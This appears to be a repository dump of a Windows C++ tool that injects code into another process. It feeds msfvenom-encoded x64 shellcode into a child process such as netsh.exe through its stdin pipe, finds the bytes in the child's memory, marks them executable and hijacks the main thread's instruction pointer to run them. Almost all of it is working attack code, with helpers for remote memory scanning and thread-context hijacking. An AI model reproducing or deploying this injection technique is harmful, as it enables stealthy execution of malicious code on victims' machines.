@@ -1,0 +1,772 @@
+Project Path: arc_TwoSevenOneT_InjectSetConsole_gsu9942g
+
+Source Tree:
+
+```txt
+arc_TwoSevenOneT_InjectSetConsole_gsu9942g
+├── InjectHelp.h
+├── InjectSetConsole.cpp
+├── InjectSetConsole.sln
+├── InjectSetConsole.vcxproj
+├── InjectSetConsole.vcxproj.filters
+├── PipeExchange.h
+└── README.md
+
+```
+
+`InjectHelp.h`:
+
+```h
+#pragma once
+#include <windows.h>
+#include <tlhelp32.h>
+#include <winternl.h>
+#include <cstdio>
+#include <cstdlib>
+#include <cstdint>
+#include <vector>
+#include <optional>
+#include <iostream>
+
+extern "C" NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
+//extern "C" NTSTATUS NTAPI NtQueryInformationThread(HANDLE, ULONG, PVOID, ULONG, PULONG);
+#pragma comment(lib, "ntdll.lib")
+
+#ifndef ThreadQuerySetWin32StartAddress
+#define ThreadQuerySetWin32StartAddress ((THREADINFOCLASS)9)
+#endif
+
+// ---------- helpers ----------
+static void PrintLastError(const char* fn) {
+    DWORD err = GetLastError();
+    LPSTR buf = nullptr;
+    FormatMessageA(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        nullptr, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPSTR)&buf, 0, nullptr);
+    std::printf("[!] %s failed (err %lu): %s\n", fn, err, buf ? buf : "unknown");
+    if (buf) LocalFree(buf);
+}
+
+static bool ParseU64(const char* s, uint64_t& out) {
+    if (!s || !*s) return false;
+    char* end = nullptr;
+    unsigned long long v = _strtoui64(s, &end, 0);
+    if (end == s || *end != '\0') return false;
+    out = v;
+    return true;
+}
+
+static void HexDump(const uint8_t* data, size_t size, uintptr_t base) {
+    constexpr size_t BPL = 16;
+    for (size_t i = 0; i < size; i += BPL) {
+        std::printf("%016llX  ", (unsigned long long)(base + i));
+        for (size_t j = 0; j < BPL; ++j) {
+            if (i + j < size) std::printf("%02X ", data[i + j]);
+            else              std::printf("   ");
+            if (j == 7) std::printf(" ");
+        }
+        std::printf(" |");
+        for (size_t j = 0; j < BPL && i + j < size; ++j) {
+            uint8_t c = data[i + j];
+            std::printf("%c", (c >= 0x20 && c < 0x7F) ? c : '.');
+        }
+        std::printf("|\n");
+    }
+}
+
+std::optional<uintptr_t> FindPatternInRemoteProcess(
+    HANDLE hProcess,
+    const std::vector<uint8_t>& pattern)
+{
+    if (pattern.empty())
+        return std::nullopt;
+
+    SYSTEM_INFO sysInfo{};
+    GetNativeSystemInfo(&sysInfo);
+
+    uintptr_t address = reinterpret_cast<uintptr_t>(sysInfo.lpMinimumApplicationAddress);
+    uintptr_t maxAddr = reinterpret_cast<uintptr_t>(sysInfo.lpMaximumApplicationAddress);
+
+    MEMORY_BASIC_INFORMATION mbi{};
+    std::vector<uint8_t> buffer;
+
+    const size_t patternSize = pattern.size();
+
+    while (address < maxAddr) {
+        // 2. Query the next region.
+        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(address),
+            &mbi, sizeof(mbi)) == 0)
+        {
+            // Cannot query here — advance one page to avoid infinite loop.
+            address += sysInfo.dwPageSize;
+            continue;
+        }
+
+        // 3. Filter: only private, committed, readable (not guarded) memory.
+        const bool isPrivate = (mbi.Type == MEM_PRIVATE);
+        const bool isCommitted = (mbi.State == MEM_COMMIT);
+        const bool isReadable = (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
+            PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
+            PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) != 0;
+        const bool isGuarded = (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) != 0;
+
+        if (isPrivate && isCommitted && isReadable && !isGuarded) {
+            SIZE_T regionSize = mbi.RegionSize;
+
+            // Skip regions smaller than the pattern.
+            if (regionSize >= patternSize) {
+                buffer.resize(regionSize);
+                SIZE_T bytesRead = 0;
+
+                // 4. Read the whole region in one shot.
+                if (ReadProcessMemory(hProcess, mbi.BaseAddress,
+                    buffer.data(), regionSize, &bytesRead) && bytesRead > 0)
+                {
+                    // 5. Search inside this chunk.
+                    const size_t limit = bytesRead - patternSize;
+                    for (size_t i = 0; i <= limit; ++i) {
+                        if (memcmp(buffer.data() + i, pattern.data(), patternSize) == 0) {
+                            uintptr_t found = reinterpret_cast<uintptr_t>(mbi.BaseAddress) + i;
+                            //CloseHandle(hProcess);
+                            return found;
+                        }
+                    }
+                }
+                // If ReadProcessMemory fails partially, we still advance below.
+            }
+        }
+
+        // Advance to next region.
+        address = reinterpret_cast<uintptr_t>(mbi.BaseAddress) + mbi.RegionSize;
+    }
+
+    //CloseHandle(hProcess);
+    return std::nullopt;
+}
+// ---------- main thread discovery ----------
+// Picks the thread whose Win32 start address falls inside the main module
+// image. Falls back to the first thread of the process.
+static DWORD GetMainThreadId(DWORD pid) {
+    uintptr_t imageBase = 0, imageEnd = 0;
+    {
+        HANDLE snap = CreateToolhelp32Snapshot(
+            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+        if (snap != INVALID_HANDLE_VALUE) {
+            MODULEENTRY32W me{}; me.dwSize = sizeof(me);
+            if (Module32FirstW(snap, &me)) {
+                imageBase = (uintptr_t)me.modBaseAddr;
+                imageEnd = imageBase + me.modBaseSize;
+            }
+            CloseHandle(snap);
+        }
+    }
+
+    DWORD best = 0, firstAny = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+
+    THREADENTRY32 te{}; te.dwSize = sizeof(te);
+    if (Thread32First(snap, &te)) {
+        do {
+            if (te.th32OwnerProcessID != pid) continue;
+            if (!firstAny) firstAny = te.th32ThreadID;
+
+            HANDLE hT = OpenThread(
+                THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION,
+                FALSE, te.th32ThreadID);
+            if (!hT) continue;
+
+            void* startAddr = nullptr;
+            NtQueryInformationThread(hT, ThreadQuerySetWin32StartAddress,
+                &startAddr, sizeof(startAddr), nullptr);
+            CloseHandle(hT);
+
+            if (startAddr && imageBase && imageEnd &&
+                (uintptr_t)startAddr >= imageBase &&
+                (uintptr_t)startAddr < imageEnd) {
+                best = te.th32ThreadID;
+                break;
+            }
+        } while (Thread32Next(snap, &te));
+    }
+    CloseHandle(snap);
+    return best ? best : firstAny;
+}
+
+// ---------- thread pause + RIP hijack ----------
+static bool HijackThreadRip(DWORD tid, uint64_t newRip, bool resumeAfter = true) {
+    HANDLE hT = OpenThread(
+        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
+        FALSE, tid);
+    if (!hT) { PrintLastError("OpenThread"); return false; }
+
+    if (SuspendThread(hT) == (DWORD)-1) {
+        PrintLastError("SuspendThread"); CloseHandle(hT); return false;
+    }
+
+    alignas(16) CONTEXT ctx {};
+    ctx.ContextFlags = CONTEXT_CONTROL;      // RIP + RSP + RBP + flags + segs
+    if (!GetThreadContext(hT, &ctx)) {
+        PrintLastError("GetThreadContext");
+        ResumeThread(hT); CloseHandle(hT); return false;
+    }
+
+    std::printf("[+] Thread %lu: old RIP = 0x%llX, RSP = 0x%llX\n",
+        tid, (unsigned long long)ctx.Rip, (unsigned long long)ctx.Rsp);
+
+    ctx.Rip = newRip;
+
+    NTSTATUS st = NtSetContextThread(hT, &ctx);
+    if (st != 0) {
+        std::printf("[!] NtSetContextThread failed: NTSTATUS = 0x%08lX\n", (unsigned long)st);
+        ResumeThread(hT); CloseHandle(hT); return false;
+    }
+    std::printf("[+] Thread %lu: new RIP = 0x%llX\n",
+        tid, (unsigned long long)newRip);
+
+    if (resumeAfter) {
+        if (ResumeThread(hT) == (DWORD)-1) PrintLastError("ResumeThread");
+        else std::printf("[+] Thread %lu resumed\n", tid);
+    }
+    CloseHandle(hT);
+    return true;
+}
+```
+
+`InjectSetConsole.cpp`:
+
+```cpp
+#include <windows.h>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <sstream>
+
+#include "PipeExchange.h"
+#include "InjectHelp.h"
+
+
+
+int main(int argc, char* argv[]) {
+    // 1. Ensure a command was passed via command line arguments
+    if (argc < 2) {
+        std::cout << "Usage: " << argv[0] << " <executable_path>\n";
+        std::cout << "Example: " << argv[0] << " C:\\Windows\\System32\\netsh.exe\n";
+        return 1;
+    }
+    //std::string cmdStr = argv[2];
+	std::string procName = argv[1];
+    // Convert the narrow string command to a wide string (wchar_t) required by CreateProcessW
+    int wchars_num = MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, NULL, 0);
+    std::vector<wchar_t> childPath(wchars_num);
+    MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, childPath.data(), wchars_num);
+
+    std::wcout << L"Launching: " << childPath.data() << L"\n\n";
+
+    HANDLE hChildStd_IN_Rd = NULL;
+    HANDLE hChildStd_IN_Wr = NULL;
+    HANDLE hChildStd_OUT_Rd = NULL;
+    HANDLE hChildStd_OUT_Wr = NULL;
+
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    // Create a pipe for the child process's STDOUT
+    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) {
+        std::cerr << "Failed to create STDOUT pipe\n";
+        return 1;
+    }
+    SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
+
+    // Create a pipe for the child process's STDIN
+    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0)) {
+        std::cerr << "Failed to create STDIN pipe\n";
+        return 1;
+    }
+    SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
+
+    // 3. Configure the STARTUPINFO structure to redirect standard streams and show window
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(STARTUPINFO);
+    si.hStdError = hChildStd_OUT_Wr;
+    si.hStdOutput = hChildStd_OUT_Wr;
+    si.hStdInput = hChildStd_IN_Rd;
+    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW; // Explicitly request the window be shown
+
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+
+    // 4. Launch the process with CREATE_NEW_CONSOLE using arguments from argv
+    if (!CreateProcess(NULL, childPath.data(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+    {
+        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
+        return 1;
+    }
+
+    // 5. CRITICAL: Close the child-side pipe handles in the parent process
+    CloseHandle(hChildStd_OUT_Wr);
+    CloseHandle(hChildStd_IN_Rd);
+    // Give the child process a brief moment to initialize
+    Sleep(200);
+
+    //msfvenom -p windows/x64/exec CMD="notepad.exe" -e x64/zutto_dekiru -b '\x0a\x0d\x1a' -f hex
+	// bad chars are 0x0a, 0x0d, 0x1a
+    //Execute code at offset 0x19
+    //Need marker to search from remote memory
+     unsigned char rawData[368] = {
+        0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64,
+        0x65, 0x65, 0x65, 0x66, 0x66, 0x66, 0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A,
+        0x6A, 0x48, 0xB8, 0x30, 0xAC, 0x10, 0x28, 0x03, 0xD6, 0x03, 0x02, 0xDB,
+        0xCA, 0x54, 0x4D, 0x31, 0xDB, 0x5B, 0x41, 0xB3, 0x23, 0x66, 0x81, 0xE3,
+        0x10, 0xF9, 0x48, 0x0F, 0xAE, 0x03, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x8B,
+        0x13, 0x49, 0xFF, 0xCB, 0x4A, 0x31, 0x44, 0xDA, 0x27, 0x4D, 0x85, 0xDB,
+        0x75, 0xF3, 0xCC, 0xE4, 0x93, 0xCC, 0xF3, 0x3E, 0xC3, 0x02, 0x30, 0xAC,
+        0x51, 0x79, 0x42, 0x86, 0x51, 0x53, 0x66, 0xE4, 0x21, 0xFA, 0x66, 0x9E,
+        0x88, 0x50, 0x50, 0xE4, 0x9B, 0x7A, 0x1B, 0x9E, 0x88, 0x50, 0x10, 0xE4,
+        0x9B, 0x5A, 0x53, 0x9E, 0x0C, 0xB5, 0x7A, 0xE6, 0x5D, 0x19, 0xCA, 0x9E,
+        0x32, 0xC2, 0x9C, 0x90, 0x71, 0x54, 0x01, 0xFA, 0x23, 0x43, 0xF1, 0x65,
+        0x1D, 0x69, 0x02, 0x17, 0xE1, 0xEF, 0x62, 0xED, 0x41, 0x60, 0x88, 0x84,
+        0x23, 0x89, 0x72, 0x90, 0x58, 0x29, 0xD3, 0x5D, 0x83, 0x8A, 0x30, 0xAC,
+        0x10, 0x60, 0x86, 0x16, 0x77, 0x65, 0x78, 0xAD, 0xC0, 0x78, 0x88, 0x9E,
+        0x1B, 0x46, 0xBB, 0xEC, 0x30, 0x61, 0x02, 0x06, 0xE0, 0x54, 0x78, 0x53,
+        0xD9, 0x69, 0x88, 0xE2, 0x8B, 0x4A, 0x31, 0x7A, 0x5D, 0x19, 0xCA, 0x9E,
+        0x32, 0xC2, 0x9C, 0xED, 0xD1, 0xE1, 0x0E, 0x97, 0x02, 0xC3, 0x08, 0x4C,
+        0x65, 0xD9, 0x4F, 0xD5, 0x4F, 0x26, 0x38, 0xE9, 0x29, 0xF9, 0x76, 0x0E,
+        0x5B, 0x46, 0xBB, 0xEC, 0x34, 0x61, 0x02, 0x06, 0x65, 0x43, 0xBB, 0xA0,
+        0x58, 0x6C, 0x88, 0x96, 0x1F, 0x4B, 0x31, 0x7C, 0x51, 0xA3, 0x07, 0x5E,
+        0x4B, 0x03, 0xE0, 0xED, 0x48, 0x69, 0x5B, 0x88, 0x5A, 0x58, 0x71, 0xF4,
+        0x51, 0x71, 0x42, 0x8C, 0x4B, 0x81, 0xDC, 0x8C, 0x51, 0x7A, 0xFC, 0x36,
+        0x5B, 0x43, 0x69, 0xF6, 0x58, 0xA3, 0x11, 0x3F, 0x54, 0xFD, 0xCF, 0x53,
+        0x4D, 0x60, 0xB9, 0xD7, 0x03, 0x02, 0x30, 0xAC, 0x10, 0x28, 0x03, 0x9E,
+        0x8E, 0x8F, 0x31, 0xAD, 0x10, 0x28, 0x42, 0x6C, 0x32, 0x89, 0x5F, 0x2B,
+        0xEF, 0xFD, 0xB8, 0x1B, 0x67, 0x9D, 0x58, 0xED, 0xAA, 0x8E, 0x96, 0x6B,
+        0x9E, 0xFD, 0xE5, 0xE4, 0x93, 0xEC, 0x2B, 0xEA, 0x05, 0x7E, 0x3A, 0x2C,
+        0xEB, 0xC8, 0x76, 0xD3, 0xB8, 0x45, 0x23, 0xDE, 0x7F, 0x42, 0x03, 0x8F,
+        0x42, 0x8B, 0xEA, 0x53, 0xC5, 0x46, 0x6C, 0xA2, 0x66, 0x72, 0x51, 0xC8,
+        0x3E, 0x4D, 0x7B, 0xB3, 0x03, 0x45, 0x31, 0x32, 0x33, 0x34, 0x34, 0x35,
+        0x34, 0x34, 0x34, 0x34, 0x34, 0x34, 0x34, 0x34
+    };
+
+
+	WriteToPipeBin(hChildStd_IN_Wr, rawData, sizeof(rawData));
+
+    // Give the process time to execute and reply
+    Sleep(2000);
+    std::cout << "--- Output After Command ---\n" << ReadFromPipe(hChildStd_OUT_Rd) << "\n";
+
+	//this is marker to search remote process memory for, then change protection and hijack RIP to execute
+    std::vector<uint8_t> rawDataPattern = {
+        0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64,
+        0x65, 0x65, 0x65, 0x66, 0x66, 0x66, 0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A,
+        0x6A
+    };
+
+    auto result = FindPatternInRemoteProcess(pi.hProcess, rawDataPattern);
+	if (!result) {
+		std::cout << "Pattern not found in remote process memory now. Wait and search again\n";
+        Sleep(2000);
+		result = FindPatternInRemoteProcess(pi.hProcess, rawDataPattern);
+	}
+    if (result) {
+        std::cout << "Found at remote address: 0x"
+            << std::hex << *result << std::dec << "\n";
+        SIZE_T  size = (SIZE_T)sizeof(rawData);
+		DWORD   newProtect = (DWORD)PAGE_EXECUTE_READWRITE;
+        MEMORY_BASIC_INFORMATION mbi{};
+        if (VirtualQueryEx(pi.hProcess, (LPCVOID)*result, &mbi, sizeof(mbi))) 
+        {
+            std::printf("[+] Region @ %p: base=%p size=0x%zX state=0x%lX protect=0x%lX type=0x%lX\n",
+                *result, mbi.BaseAddress, mbi.RegionSize,
+                mbi.State, mbi.Protect, mbi.Type);
+        }
+        else {
+            PrintLastError("VirtualQueryEx (continuing anyway)");
+        }
+
+        // 2) Read remote memory at address/size.
+        std::vector<uint8_t> buf(size);
+        SIZE_T got = 0;
+        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)*result, buf.data(), size, &got)) {
+            PrintLastError("ReadProcessMemory");
+            CloseHandle(pi.hProcess); return 1;
+        }
+        std::printf("[+] Read %zu/%zu bytes from 0x%llX\n\n",
+            (size_t)got, (size_t)size, (unsigned long long) * result);
+
+        // 3) Hex dump.
+        //std::printf("--- Hex dump @ 0x%llX ---\n", (unsigned long long) * result);
+        //HexDump(buf.data(), (size_t)got, (uintptr_t)*result);
+        //std::printf("--- End ---\n\n");
+
+        // 4) Change protection on the remote region (needs PROCESS_VM_OPERATION).
+        if (newProtect != 0) {
+            DWORD oldProt = 0;
+            if (!VirtualProtectEx(pi.hProcess, (LPVOID)*result, size, newProtect, &oldProt)) {
+                PrintLastError("VirtualProtectEx");
+                CloseHandle(pi.hProcess); return 1;
+            }
+            std::printf("[+] VirtualProtectEx OK: 0x%llX size=%zu  old=0x%lX new=0x%lX\n\n",
+                (unsigned long long) * result, (size_t)size, oldProt, newProtect);
+        }
+        else {
+            std::printf("[i] new_protect == 0, skipping VirtualProtectEx and RIP hijack\n");
+            CloseHandle(pi.hProcess);
+            return 0;
+        }
+
+        // 5) Find the main thread of the remote process.
+        DWORD mainTid = GetMainThreadId(pi.dwProcessId);
+        if (!mainTid) {
+            std::printf("[!] Could not find main thread for PID %lu\n", pi.dwProcessId);
+            CloseHandle(pi.hProcess); return 1;
+        }
+        std::printf("[+] Main thread TID = %lu\n", mainTid);
+
+        //Execute code at offset 0x19
+        if (!HijackThreadRip(mainTid, ((*result)+0x19), /*resumeAfter=*/true)) {
+            std::printf("[!] Failed to hijack thread %lu\n", mainTid);
+            CloseHandle(pi.hProcess); return 1;
+        }
+
+        std::printf("\n[+] Done. Main thread now executing at 0x%llX\n",
+            (unsigned long long)* result);
+    }
+    else {
+        std::cout << "Pattern not found.\n";
+    }
+
+    std::cout << "In some put to exit and trigger child thread\n";
+	std::cin.get(); // Wait for user input before proceeding
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hChildStd_OUT_Rd);
+    CloseHandle(hChildStd_IN_Wr);
+
+    return 0;
+}
+
+```
+
+`InjectSetConsole.sln`:
+
+```sln
+
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio Version 17
+VisualStudioVersion = 17.13.35825.156
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "InjectSetConsole", "InjectSetConsole.vcxproj", "{13631C22-93BF-4B11-A3AB-C49835B51755}"
+EndProject
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ReadAndSetExecute", "..\ReadAndSetExecute\ReadAndSetExecute.vcxproj", "{1C763DCB-CBB2-473B-8103-040E97C3D463}"
+EndProject
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "CheckBadBytes", "..\CheckBadBytes\CheckBadBytes.vcxproj", "{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|x64 = Debug|x64
+		Debug|x86 = Debug|x86
+		Release|x64 = Release|x64
+		Release|x86 = Release|x86
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Debug|x64.ActiveCfg = Debug|x64
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Debug|x64.Build.0 = Debug|x64
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Debug|x86.ActiveCfg = Debug|Win32
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Debug|x86.Build.0 = Debug|Win32
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Release|x64.ActiveCfg = Release|x64
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Release|x64.Build.0 = Release|x64
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Release|x86.ActiveCfg = Release|Win32
+		{13631C22-93BF-4B11-A3AB-C49835B51755}.Release|x86.Build.0 = Release|Win32
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Debug|x64.ActiveCfg = Debug|x64
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Debug|x64.Build.0 = Debug|x64
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Debug|x86.ActiveCfg = Debug|Win32
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Debug|x86.Build.0 = Debug|Win32
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Release|x64.ActiveCfg = Release|x64
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Release|x64.Build.0 = Release|x64
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Release|x86.ActiveCfg = Release|Win32
+		{1C763DCB-CBB2-473B-8103-040E97C3D463}.Release|x86.Build.0 = Release|Win32
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Debug|x64.ActiveCfg = Debug|x64
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Debug|x64.Build.0 = Debug|x64
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Debug|x86.ActiveCfg = Debug|Win32
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Debug|x86.Build.0 = Debug|Win32
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Release|x64.ActiveCfg = Release|x64
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Release|x64.Build.0 = Release|x64
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Release|x86.ActiveCfg = Release|Win32
+		{4C893E91-B840-4DCF-A74D-B8F3AB5BE535}.Release|x86.Build.0 = Release|Win32
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+	GlobalSection(ExtensibilityGlobals) = postSolution
+		SolutionGuid = {F2CC0B12-44E5-45EE-A1FD-298A4081496C}
+	EndGlobalSection
+EndGlobal
+
+```
+
+`InjectSetConsole.vcxproj`:
+
+```vcxproj
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{13631c22-93bf-4b11-a3ab-c49835b51755}</ProjectGuid>
+    <RootNamespace>InjectSetConsole</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+    </ClCompile>
